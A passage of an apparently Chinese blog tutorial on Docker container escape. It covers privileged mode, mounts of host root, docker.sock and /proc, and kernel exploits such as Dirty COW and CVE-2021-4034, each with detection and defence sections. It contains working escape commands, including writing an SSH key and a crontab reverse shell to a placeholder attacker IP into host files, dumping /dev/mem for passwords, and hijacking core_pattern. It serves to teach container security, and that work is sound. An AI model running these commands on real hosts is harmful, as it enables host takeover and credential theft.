<h3 id="特权模式（Privileged-Mode）逃逸技术详解"><a href="#特权模式（Privileged-Mode）逃逸技术详解" class="headerlink" title="特权模式（Privileged Mode）逃逸技术详解"></a>特权模式（Privileged Mode）逃逸技术详解</h3><h4 id="1-特权模式的定义与作用"><a href="#1-特权模式的定义与作用" class="headerlink" title="1. 特权模式的定义与作用"></a>1. 特权模式的定义与作用</h4><p>当容器以 <code>--privileged</code> 模式启动时，Docker 会赋予容器 <strong>所有 Linux Capabilities</strong>，并解除设备访问限制。这意味着：</p>
<ul>
<li>容器内进程拥有与宿主机 root 用户几乎等同的权限。</li>
<li>容器可以直接访问宿主机所有设备（如 <code>/dev/sda1</code>、<code>/dev/tty0</code> 等）。</li>
<li>允许执行需要高权限的操作，如加载内核模块、修改内核参数、挂载文件系统等。</li>
</ul>
<h4 id="2-逃逸的核心原理"><a href="#2-逃逸的核心原理" class="headerlink" title="2. 逃逸的核心原理"></a>2. 逃逸的核心原理</h4><p>特权模式的容器突破了默认的隔离机制，攻击者可利用以下路径逃逸：</p>
<ul>
<li><strong>挂载宿主机文件系统</strong>：通过挂载宿主机磁盘，直接修改敏感文件（如 SSH 密钥、cron 任务）。</li>
<li><strong>内核操作</strong>：利用内核功能或漏洞（如 Dirty COW）提权到宿主机。</li>
<li><strong>设备访问</strong>：直接读写宿主机硬件设备（如内存、磁盘）。</li>
</ul>
<hr>
<h3 id="3-检测是否处于特权容器"><a href="#3-检测是否处于特权容器" class="headerlink" title="3. 检测是否处于特权容器"></a>3. 检测是否处于特权容器</h3><h4 id="1-检查-Capabilities"><a href="#1-检查-Capabilities" class="headerlink" title="(1) 检查 Capabilities"></a><strong>(1) 检查 Capabilities</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/status | grep CapEff</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>特权容器</strong>：<code>CapEff</code> 值为 <code>0000003fffffffff</code>或<code>0000001fffffffff</code>（所有能力开启）。</li>
<li><strong>普通容器</strong>：Capabilities 受限（如 <code>00000000a80425fb</code>）。</li>
</ul>
<h4 id="2-查看挂载的设备"><a href="#2-查看挂载的设备" class="headerlink" title="(2) 查看挂载的设备"></a><strong>(2) 查看挂载的设备</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount | grep /dev</span><br></pre></td></tr></table></figure>

<ul>
<li>特权容器可能挂载 <code>/dev/sda1</code>、<code>/dev/mem</code> 等宿主机设备。</li>
</ul>
<hr>
<h3 id="4-典型利用步骤与示例"><a href="#4-典型利用步骤与示例" class="headerlink" title="4. 典型利用步骤与示例"></a>4. 典型利用步骤与示例</h3><h4 id="1-挂载宿主机根目录逃逸"><a href="#1-挂载宿主机根目录逃逸" class="headerlink" title="(1) 挂载宿主机根目录逃逸"></a><strong>(1) 挂载宿主机根目录逃逸</strong></h4><p><strong>场景</strong>：攻击者通过特权容器挂载宿主机根目录，直接修改文件系统。</p>
<p><strong>步骤</strong>：</p>
<ol>
<li><p><strong>启动特权容器</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --privileged ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查看宿主机磁盘设备</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在容器内查看磁盘设备（通常为 /dev/sda1 或 /dev/vda1） 如果没有权限也没有关系能里出来就行</span></span><br><span class="line"><span class="comment"># 如果没有fdisk 命令那么就只能遍历了</span></span><br><span class="line">fdisk -l</span><br><span class="line"><span class="built_in">df</span> -h</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250520233002904.png?x-oss-process=style/img-to-webp" alt="image-20250520233002904"></p>
</li>
</ol>
<p>​	宿主机的显示</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Disk /dev/sda：80 GiB，85899345920 字节，167772160 个扇区</span><br><span class="line">Disk model: VMware Virtual S</span><br><span class="line">单元：扇区 / 1 * 512 = 512 字节</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line">磁盘标签类型：dos</span><br><span class="line">磁盘标识符：0xa873673b</span><br><span class="line"></span><br><span class="line">设备       启动    起点      末尾      扇区  大小 Id 类型</span><br><span class="line">/dev/sda1  *       2048   1050623   1048576  512M  b W95 FAT32</span><br><span class="line">/dev/sda2       1052670 167770111 166717442 79.5G  5 扩展</span><br><span class="line">/dev/sda5       1052672 167770111 166717440 79.5G 83 Linux</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p><strong>挂载宿主机根目录到容器内</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /host</span><br><span class="line">mount /dev/sda1 /host  <span class="comment"># 挂载宿主机磁盘到容器内的 /host 目录</span></span><br></pre></td></tr></table></figure>

<p><strong>其他方式可能可以使用的方式</strong>:</p>
<p>挂载目录后，可以容器的工作目录到&#x2F;host中</p>
<p>这时可以直接执行useradd命令添加宿主机的用户，甚至可以执行docker的命令，k8s里可以使用kubectl命令 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> /host sh</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>修改宿主机文件</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写入 SSH 公钥到宿主机的 root 用户</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2E...&quot;</span> &gt;&gt; /host/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或写入定时任务反弹 Shell</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;* * * * * root bash -i &gt;&amp; /dev/tcp/攻击者IP/端口 0&gt;&amp;1&quot;</span> &gt;&gt; /host/etc/crontab</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用私钥文件登陆宿主机、或者</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用私钥登录</span></span><br><span class="line">ssh root@宿主机IP </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取定时任务端口监听</span></span><br><span class="line">nc -lnvp 端口</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h4 id="2-利用设备文件读写内存"><a href="#2-利用设备文件读写内存" class="headerlink" title="(2) 利用设备文件读写内存"></a><strong>(2) 利用设备文件读写内存</strong></h4><p><strong>场景</strong>：通过 <code>/dev/mem</code> 或 <code>/dev/kmem</code> 直接读写宿主机内存。</p>
<p><strong>步骤</strong>：</p>
<ol>
<li><p><strong>在特权容器中访问物理内存</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取宿主机物理内存（需 CAP_SYS_RAWIO 权限）</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/mem of=/tmp/mem.dump bs=1M count=100</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>分析内存提取敏感信息</strong>（如密码、密钥）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /tmp/mem.dump | grep -i <span class="string">&quot;password&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="（3）所有可以尝试的方式"><a href="#（3）所有可以尝试的方式" class="headerlink" title="（3）所有可以尝试的方式"></a>（3）所有可以尝试的方式</h4><ol>
<li>向宿主机写入公私钥</li>
<li>向宿主机写入计划任务</li>
<li>向宿主机写入后门用户</li>
<li>搜索宿主机上的敏感文件</li>
<li>如果宿主机开启 Web 服务，还可以写入 WebShell</li>
</ol>
<hr>
<h3 id="5-防御措施"><a href="#5-防御措施" class="headerlink" title="5. 防御措施"></a>5. 防御措施</h3><ol>
<li><p><strong>避免使用特权模式</strong>：</p>
<ul>
<li>除非绝对必要，否则禁止使用 <code>--privileged</code>。</li>
<li>替代方案：通过 <code>--cap-add</code> 按需授予特定权限（如 <code>CAP_NET_ADMIN</code>）。</li>
</ul>
</li>
<li><p><strong>最小化 Capabilities</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --cap-drop=ALL --cap-add=必要的权限 ...</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>限制设备访问</strong>：</p>
<ul>
<li>使用 <code>--device</code> 仅允许访问特定设备：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --device=/dev/ttyUSB0 ...</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>安全加固配置</strong>：</p>
<ul>
<li>启用 <strong>AppArmor</strong> 或 <strong>SELinux</strong> 限制容器行为。</li>
<li>配置 <strong>Seccomp</strong> 过滤危险系统调用。</li>
</ul>
</li>
<li><p><strong>文件系统只读挂载</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /宿主机目录:/容器目录:ro ...</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h2 id="三、挂载宿主机敏感目录"><a href="#三、挂载宿主机敏感目录" class="headerlink" title="三、挂载宿主机敏感目录"></a>三、挂载宿主机敏感目录</h2><hr>
<h3 id="挂载宿主机敏感目录容器逃逸技术详解"><a href="#挂载宿主机敏感目录容器逃逸技术详解" class="headerlink" title="挂载宿主机敏感目录容器逃逸技术详解"></a><strong>挂载宿主机敏感目录容器逃逸技术详解</strong></h3><hr>
<h4 id="1-漏洞原理-1"><a href="#1-漏洞原理-1" class="headerlink" title="1. 漏洞原理"></a><strong>1. 漏洞原理</strong></h4><p>当容器启动时通过 <code>-v</code> 或 <code>--mount</code> 参数挂载宿主机的敏感目录（如根目录 <code>/</code>、<code>/var/run/docker.sock</code>、<code>/root</code> 等），攻击者可通过容器内的挂载路径直接读写宿主机文件系统或操作 Docker 服务，从而突破容器隔离，获取宿主机权限。</p>
<p><strong>核心风险点</strong>：</p>
<ul>
<li><strong>宿主机文件系统暴露</strong>：挂载 <code>/</code> 或 <code>/etc</code> 等目录，允许容器内直接修改关键配置文件。</li>
<li><strong>Docker 控制权泄露</strong>：挂载 <code>/var/run/docker.sock</code> 后，容器可通过 Docker API 创建新容器或控制宿主机的容器生命周期。</li>
<li><strong>敏感数据泄露</strong>：挂载 <code>/root</code>、<code>/home</code> 等目录可能直接暴露用户敏感文件（如 SSH 密钥、凭据文件）。</li>
</ul>
<hr>
<h4 id="2-常见敏感目录及攻击场景"><a href="#2-常见敏感目录及攻击场景" class="headerlink" title="2. 常见敏感目录及攻击场景"></a><strong>2. 常见敏感目录及攻击场景</strong></h4><table>
<thead>
<tr>
<th><strong>敏感目录</strong></th>
<th><strong>攻击场景</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>/</code>（根目录）</strong></td>
<td>直接修改宿主机文件（如 <code>/etc/crontab</code>、<code>/root/.ssh/authorized_keys</code>）。</td>
</tr>
<tr>
<td><strong><code>/var/run/docker.sock</code></strong></td>
<td>通过 Docker API 创建特权容器挂载宿主机目录，或直接执行宿主机命令。</td>
</tr>
<tr>
<td><strong><code>/proc</code></strong></td>
<td>修改内核参数（如 <code>core_pattern</code>）触发宿主机代码执行。</td>
</tr>
<tr>
<td><strong><code>/sys</code></strong></td>
<td>修改系统配置或硬件信息，可能导致拒绝服务或提权。</td>
</tr>
<tr>
<td><strong><code>/root</code> 或 <code>/home</code></strong></td>
<td>窃取用户 SSH 密钥、历史命令记录（<code>.bash_history</code>）或配置文件。</td>
</tr>
</tbody></table>
<hr>
<h4 id="3-攻击步骤与示例"><a href="#3-攻击步骤与示例" class="headerlink" title="3. 攻击步骤与示例"></a><strong>3. 攻击步骤与示例</strong></h4><h5 id="场景-1：挂载宿主机根目录（-）逃逸"><a href="#场景-1：挂载宿主机根目录（-）逃逸" class="headerlink" title="场景 1：挂载宿主机根目录（/）逃逸"></a><strong>场景 1：挂载宿主机根目录（<code>/</code>）逃逸</strong></h5><p><strong>步骤</strong>：</p>
<ol>
<li><p><strong>启动容器并挂载宿主机根目录</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /:/host ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在容器内通过挂载点修改宿主机文件</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写入 SSH 公钥到宿主机 root 用户</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2E...&quot;</span> &gt;&gt; /host/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加定时任务反弹 Shell</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;* * * * * root bash -i &gt;&amp; /dev/tcp/攻击者IP/端口 0&gt;&amp;1&quot;</span> &gt;&gt; /host/etc/crontab</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>通过 SSH 或定时任务获取宿主机权限</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用私钥登录</span></span><br><span class="line">ssh root@宿主机IP </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取定时任务端口监听</span></span><br><span class="line">nc -lnvp 端口</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h5 id="场景-2：挂载-Docker-Socket（-var-run-docker-sock）逃逸"><a href="#场景-2：挂载-Docker-Socket（-var-run-docker-sock）逃逸" class="headerlink" title="场景 2：挂载 Docker Socket（/var/run/docker.sock）逃逸"></a><strong>场景 2：挂载 Docker Socket（<code>/var/run/docker.sock</code>）逃逸</strong></h5><p><strong>步骤</strong>：</p>
<ol>
<li><p><strong>启动容器并挂载 Docker Socket</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在容器内安装 Docker 客户端工具</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install docker.io -y</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>通过 Docker API 创建特权容器挂载宿主机根目录</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///var/run/docker.sock run -it -v /:/host alpine <span class="built_in">chroot</span> /host sh</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在特权容器内执行宿主机命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;恶意操作&quot;</span> &gt; /host/etc/恶意文件</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h5 id="场景-3：挂载-proc-目录触发代码执行"><a href="#场景-3：挂载-proc-目录触发代码执行" class="headerlink" title="场景 3：挂载 /proc 目录触发代码执行"></a><strong>场景 3：挂载 <code>/proc</code> 目录触发代码执行</strong></h5><p><strong>步骤</strong>：</p>
<ol>
<li><p><strong>启动容器并挂载 &#x2F;proc</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /proc:/host_proc ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>修改宿主机的 <code>core_pattern</code> 以触发代码执行</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;|/tmp/exploit&#x27;</span> &gt; /host_proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在宿主机上触发崩溃生成 Core Dump</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在宿主机执行（或在容器内攻击宿主机进程）</span></span><br><span class="line"><span class="built_in">kill</span> -SEGV $(pidof 某服务)</span><br></pre></td></tr></table></figure>
<ul>
<li>宿主机崩溃时会执行 <code>/tmp/exploit</code>（需提前植入恶意脚本）。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="4-检测容器是否挂载敏感目录"><a href="#4-检测容器是否挂载敏感目录" class="headerlink" title="4. 检测容器是否挂载敏感目录"></a><strong>4. 检测容器是否挂载敏感目录</strong></h4><p><strong>方法 1：检查容器挂载信息</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前容器的挂载点</span></span><br><span class="line">mount | grep -E <span class="string">&quot;/ |/var/run/docker.sock|/proc&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>方法 2：检查 Docker 启动命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看容器启动参数（需宿主机权限）</span></span><br><span class="line">docker inspect &lt;容器ID&gt; | grep -A 10 <span class="string">&quot;Mounts&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>方法 3：自动化检测脚本</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 检测敏感目录挂载</span></span><br><span class="line">敏感挂载点=(<span class="string">&quot;/ &quot;</span> <span class="string">&quot;/var/run/docker.sock&quot;</span> <span class="string">&quot;/proc&quot;</span> <span class="string">&quot;/sys&quot;</span> <span class="string">&quot;/root&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> 挂载点 <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;敏感挂载点[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> mount | grep -q <span class="string">&quot;$挂载点&quot;</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[!] 检测到敏感目录挂载: $挂载点&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="5-防御措施-1"><a href="#5-防御措施-1" class="headerlink" title="5. 防御措施"></a><strong>5. 防御措施</strong></h4><ol>
<li><p><strong>禁止挂载敏感目录</strong>：</p>
<ul>
<li>避免使用 <code>-v /:/host</code> 或 <code>-v /var/run/docker.sock</code> 等高危操作。</li>
<li>使用命名卷（Named Volumes）替代直接挂载主机路径。</li>
</ul>
</li>
<li><p><strong>最小化挂载权限</strong>：</p>
<ul>
<li>若必须挂载，使用只读模式（<code>ro</code>）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /宿主机目录:/容器目录:ro ...</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>限制 Docker Socket 访问</strong>：</p>
<ul>
<li>禁止容器挂载 <code>/var/run/docker.sock</code>。</li>
<li>若需远程管理 Docker，启用 TLS 认证并限制 IP 访问。</li>
</ul>
</li>
<li><p><strong>安全加固配置</strong>：</p>
<ul>
<li>启用 <strong>AppArmor</strong> 或 <strong>SELinux</strong> 限制容器文件系统访问。</li>
<li>配置 <strong>Seccomp</strong> 过滤危险系统调用（如 <code>mount</code>、<code>ptrace</code>）。</li>
</ul>
</li>
<li><p><strong>定期审计容器配置</strong>：</p>
<ul>
<li>使用工具（如 <code>docker-bench-security</code>）扫描不安全配置。</li>
<li>监控容器挂载点变更和异常文件操作。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="6-实际案例"><a href="#6-实际案例" class="headerlink" title="6. 实际案例"></a><strong>6. 实际案例</strong></h4><ul>
<li><p><strong>案例 1：Kubernetes 集群挂载逃逸</strong><br>攻击者通过挂载 <code>hostPath</code> 卷到 Pod 中，修改宿主机 <code>/etc/shadow</code> 文件重置 root 密码。</p>
</li>
<li><p><strong>案例 2：Docker Socket 滥用</strong><br>某开发环境因挂载 <code>docker.sock</code>，攻击者在容器内创建新容器并挂载宿主机根目录，窃取 Kubernetes 集群凭证。</p>
</li>
</ul>
<hr>
<h2 id="四、内核漏洞逃逸"><a href="#四、内核漏洞逃逸" class="headerlink" title="四、内核漏洞逃逸"></a>四、内核漏洞逃逸</h2><hr>
<h3 id="内核漏洞逃逸技术详解"><a href="#内核漏洞逃逸技术详解" class="headerlink" title="内核漏洞逃逸技术详解"></a><strong>内核漏洞逃逸技术详解</strong></h3><hr>
<h4 id="1-内核漏洞逃逸原理"><a href="#1-内核漏洞逃逸原理" class="headerlink" title="1. 内核漏洞逃逸原理"></a><strong>1. 内核漏洞逃逸原理</strong></h4><p>容器（如 Docker、LXC）依赖于 Linux 内核的 <strong>命名空间（Namespaces）</strong> 和 <strong>控制组（Cgroups）</strong> 实现资源隔离。若宿主机内核存在未修复的漏洞，攻击者可在容器内利用漏洞突破隔离，直接控制宿主机系统。此类逃逸不依赖容器配置错误，<strong>即使容器以非特权模式运行，也可能成功</strong>。</p>
<hr>
<h3 id="2-漏洞利用条件"><a href="#2-漏洞利用条件" class="headerlink" title="2. 漏洞利用条件"></a><strong>2. 漏洞利用条件</strong></h3><ol>
<li><strong>内核版本存在已知漏洞</strong>（如未修复的 CVE）。</li>
<li><strong>容器具备执行漏洞利用程序的条件</strong>：<ul>
<li>允许执行自定义二进制文件（如未限制 <code>exec</code>）。</li>
<li>具备必要的 Capabilities（如 <code>CAP_SYS_ADMIN</code>、<code>CAP_SYS_PTRACE</code>）。</li>
</ul>
</li>
<li><strong>漏洞利用代码（Exploit）适配当前内核环境</strong>。</li>
</ol>
<hr>
<h3 id="3-典型内核漏洞与利用场景"><a href="#3-典型内核漏洞与利用场景" class="headerlink" title="3. 典型内核漏洞与利用场景"></a><strong>3. 典型内核漏洞与利用场景</strong></h3><h4 id="1-Dirty-COW（CVE-2016-5195）"><a href="#1-Dirty-COW（CVE-2016-5195）" class="headerlink" title="(1) Dirty COW（CVE-2016-5195）"></a><strong>(1) Dirty COW（CVE-2016-5195）</strong></h4><ul>
<li><strong>漏洞类型</strong>：竞争条件漏洞（Copy-On-Write 机制缺陷）。</li>
<li><strong>影响范围</strong>：Linux 内核 2.6.22 ~ 4.8.3。</li>
<li><strong>利用效果</strong>：通过修改只读内存页提权到宿主机 root。</li>
<li><strong>利用步骤</strong>：<ol>
<li>在容器内下载并编译 Exploit（如 <a target="_blank" rel="noopener" href="https://github.com/gebl/dirtycow-docker-vdso">dirtycow-docker-vdso</a>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/gebl/dirtycow-docker-vdso.git</span><br><span class="line"><span class="built_in">cd</span> dirtycow-docker-vdso</span><br><span class="line">make</span><br></pre></td></tr></table></figure></li>
<li>执行 Exploit 获取宿主机 root Shell：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./0xdeadbeef</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<h4 id="2-CVE-2022-0185（文件系统挂载逃逸）"><a href="#2-CVE-2022-0185（文件系统挂载逃逸）" class="headerlink" title="(2) CVE-2022-0185（文件系统挂载逃逸）"></a><strong>(2) CVE-2022-0185（文件系统挂载逃逸）</strong></h4><ul>
<li><strong>漏洞类型</strong>：Linux 内核 <code>fsconfig</code> 堆溢出漏洞。</li>
<li><strong>影响范围</strong>：Linux 内核 5.1~5.16.2。</li>
<li><strong>利用效果</strong>：通过创建恶意挂载命名空间实现容器逃逸。</li>
<li><strong>利用步骤</strong>：<ol>
<li>在容器内编译并运行 Exploit（如 <a target="_blank" rel="noopener" href="https://github.com/chenaotian/CVE-2022-0185">CVE-2022-0185</a>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译 Exploit</span></span><br><span class="line">gcc -o exploit exploit.c</span><br></pre></td></tr></table></figure></li>
<li>执行 Exploit 创建特权进程：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exploit</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<h4 id="3-CVE-2021-4034（Polkit-提权）"><a href="#3-CVE-2021-4034（Polkit-提权）" class="headerlink" title="(3) CVE-2021-4034（Polkit 提权）"></a><strong>(3) CVE-2021-4034（Polkit 提权）</strong></h4><ul>
<li><strong>漏洞类型</strong>：Polkit 的 <code>pkexec</code> 组件本地提权漏洞。</li>
<li><strong>影响范围</strong>：Linux 系统未更新 <code>polkit</code> 的版本。</li>
<li><strong>利用效果</strong>：在容器内获取宿主机 root 权限（需容器与宿主机共享用户命名空间）。</li>
<li><strong>利用步骤</strong>：<ol>
<li>下载并运行 Exploit（如 <a target="_blank" rel="noopener" href="https://github.com/berdav/CVE-2021-4034">CVE-2021-4034</a>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">./cve-2021-4034</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<hr>
<h3 id="4-漏洞利用流程"><a href="#4-漏洞利用流程" class="headerlink" title="4. 漏洞利用流程"></a><strong>4. 漏洞利用流程</strong></h3><ol>
<li><p><strong>信息收集</strong>：</p>
<ul>
<li>查看内核版本：<code>uname -a</code></li>
<li>检查 Capabilities：<code>cat /proc/self/status | grep CapEff</code></li>
<li>确认 Exploit 适配性（如架构、内核补丁状态）。</li>
</ul>
</li>
<li><p><strong>漏洞验证</strong>：</p>
<ul>
<li>使用公开的 PoC（Proof of Concept）代码测试漏洞是否存在。</li>
</ul>
</li>
<li><p><strong>编译与执行 Exploit</strong>：</p>
<ul>
<li>在容器内上传或下载 Exploit 代码。</li>
<li>编译并运行（需确保容器内具备编译环境，如 <code>gcc</code>、<code>make</code>）。</li>
</ul>
</li>
<li><p><strong>提权后操作</strong>：</p>
<ul>
<li>写入 SSH 密钥、反弹 Shell 或直接操作宿主机文件系统。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="5-检测内核漏洞"><a href="#5-检测内核漏洞" class="headerlink" title="5. 检测内核漏洞"></a><strong>5. 检测内核漏洞</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看内核版本</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查已知漏洞是否修复（如 Dirty COW）</span></span><br><span class="line"><span class="built_in">cat</span> /proc/sys/vm/dirty_writeback_centisecs  <span class="comment"># 若返回 0，可能已修复</span></span><br></pre></td></tr></table></figure>



<h2 id="五、其他CVE逃逸漏洞"><a href="#五、其他CVE逃逸漏洞" class="headerlink" title="五、其他CVE逃逸漏洞"></a>五、其他CVE逃逸漏洞</h2><p>以下是近年来公开的主要容器逃逸漏洞及技术分类，结合影响范围和利用原理进行总结：</p>
<hr>
